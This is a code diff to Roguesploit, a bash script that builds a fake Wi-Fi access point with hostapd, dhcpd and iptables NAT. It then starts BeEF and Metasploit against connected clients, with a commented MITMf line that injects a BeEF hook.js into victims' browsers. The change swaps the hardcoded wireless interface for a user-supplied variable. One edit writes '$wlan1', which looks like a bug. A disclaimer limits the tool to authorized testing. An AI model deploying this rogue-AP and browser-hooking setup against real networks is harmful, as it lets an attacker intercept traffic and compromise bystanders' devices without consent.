@@ -85,15 +85,15 @@ EOF
 
 relase_rules () {
 	pkill dhcpd
-	ifconfig wlan1 up 10.0.0.1 netmask 255.255.255.0
+	ifconfig $wlan up 10.0.0.1 netmask 255.255.255.0
 	iptables -F
 	iptables -t nat -F
 	iptables -t mangle -F
-	iptables -t nat -A POSTROUTING -o wlan0 -j MASQUERADE
-	iptables -A FORWARD -i wlan1 -j ACCEPT
+	iptables -t nat -A POSTROUTING -o $wlan -j MASQUERADE
+	iptables -A FORWARD -i $wlan -j ACCEPT
 	#iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000 <-- enable this if you want to give internet to the interface
 	touch /var/lib/dhcp/dhcpd.leases
-	dhcpd -cf dhcpd.conf wlan1
+	dhcpd -cf dhcpd.conf $wlan
 }
 #AutoPWN 1
 autopwning1 () {
@@ -906,7 +906,7 @@ beef:
 EOF
 	sleep 0.6
 	echo -e $blue"["$red"!"$blue"]"$white" Starting Roguesploit Pwning! "$blue"["$red"!"$blue"]"
-	rogueon && echo -e $blue"["$red"!"$blue"]"$white" MITMF will load after 20 sec to permit BeEF to load everything!"$blue"["$red"!"$blue"]" & xterm -title "BeEF" -bg "#000000" -fg "#FFFFFF" -geometry 100x25+1 -e "bash BeEFStarter.sh"& xterm -title "MSF" -bg "#000000" -fg "#FFFFFF" -geometry 100x25+1-1 -e "sudo msfconsole -r roguepwn3.rc" #sleep 20 && xterm -title "MITMF" -bg "#000000" -fg "#FFFFFF" -geometry 100x25-1 -e "sudo mitmf -i wlan1 --hsts --inject --js-url "http://10.0.0.1:3000/hook.js"" #enable this instead of starting msf captive portal, but you'll need an internet connection and enable line 114. Add "--browsersniper" if you want to enable automatic pwning of injected browsers;
+	rogueon && echo -e $blue"["$red"!"$blue"]"$white" MITMF will load after 20 sec to permit BeEF to load everything!"$blue"["$red"!"$blue"]" & xterm -title "BeEF" -bg "#000000" -fg "#FFFFFF" -geometry 100x25+1 -e "bash BeEFStarter.sh"& xterm -title "MSF" -bg "#000000" -fg "#FFFFFF" -geometry 100x25+1-1 -e "sudo msfconsole -r roguepwn3.rc" #sleep 20 && xterm -title "MITMF" -bg "#000000" -fg "#FFFFFF" -geometry 100x25-1 -e "sudo mitmf -i $wlan --hsts --inject --js-url "http://10.0.0.1:3000/hook.js"" #enable this instead of starting msf captive portal, but you'll need an internet connection and enable line 114. Add "--browsersniper" if you want to enable automatic pwning of injected browsers;
 #but you need to change some other option to enable correctly the metasploit method too;
 # Line 336: "auto_msfrpcd: false" to "auto_msfrpcd: true"
 # Line 284: "enable: false" to "enable: true"
@@ -919,6 +919,8 @@ EOF
 #Welcome Screen
 welcome () {
 myname=$(zenity --entry --title="[*] ROGUESPLOIT [*]" --text=" Input your name or nick :D ");
+#Interface
+wlan=$(zenity --entry --title="[*] ROGUESPLOIT [*]" --text=" What interface would you like to use :D ");
 zenity --info --title="[*] WELCOME TO ROGUESPLOIT $myname [*]" --text="I am not anyway responsable for the usage of this tool. This tool is intended for legal, study, pentesting, authorized purposes! This tool is shared freely on GitHub, and you can modify it, take it, use it as you want, but remember to mention the author in it." --width=400 --height=40
 }
 #menu1
@@ -948,12 +950,12 @@ if test $answer1 == '1'
 	read nameap
 	zenity --info --title="[*] ROGUESPLOIT [*]" --text="Starting the Fake Access Point";
 	sleep 1
-	echo -e $red"[!] $myname YOU NEED WLAN1 INTERFACE FOR THESE [!]"
+	echo -e $red"[!] $myname YOU NEED $wlan INTERFACE FOR THESE [!]"
 	sleep 1
-	echo -e $yellow"Starting RogueAP on wlan1 with name $nameap"
+	echo -e $yellow"Starting RogueAP on $wlan with name $nameap"
 	sleep 2
 	service network-manager stop
-	echo "interface=wlan1
+	echo "interface=$wlan1
 driver=nl80211
 ssid=$nameap
 channel=6 "> $PWD/hostapd.conf
@@ -1164,12 +1166,12 @@ if test $answer1 == '1'
 	read nameap
 	zenity --info --title="[*] ROGUESPLOIT [*]" --text="Starting the Fake Access Point";
 	sleep 1
-	echo -e $red"[!] $myname YOU NEED WLAN1 INTERFACE FOR THESE [!]"
+	echo -e $red"[!] $myname YOU NEED $wlan INTERFACE FOR THESE [!]"
 	sleep 1
-	echo -e $yellow"Starting RogueAP on wlan1 with name $nameap"
+	echo -e $yellow"Starting RogueAP on $wlan with name $nameap"
 	sleep 2
 	service network-manager stop
-	echo "interface=wlan1
+	echo "interface=$wlan
 driver=nl80211
 ssid=$nameap
 channel=6 "> $PWD/hostapd.conf
